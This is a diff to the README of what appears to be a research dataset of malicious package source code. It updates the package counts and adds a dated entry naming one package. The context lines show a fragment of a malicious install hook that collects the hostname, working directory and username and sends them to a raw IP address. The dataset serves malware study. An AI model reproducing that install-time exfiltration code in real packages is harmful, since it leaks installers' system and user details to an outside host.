@@ -1,6 +1,6 @@
 ## Dataset Size
 
-This data set includes about 7,140 versions of the source code of 6,061 malicious packages.
+This data set includes about 7,141 versions of the source code of 6,062 malicious packages.
 
 ## Dataset Format
 
@@ -875,6 +875,10 @@ class CustomInstall(install):
         ploads = {'hostname':hostname,'cwd':cwd,'username':username}
         requests.get("http://9.30.214.68",params = ploads)
 ```
+
+
+### 27 Jul. 2024
+stackstorm-runner-action-chain [1.0.0] <br>
 
 ## About the malicious packages detection
 
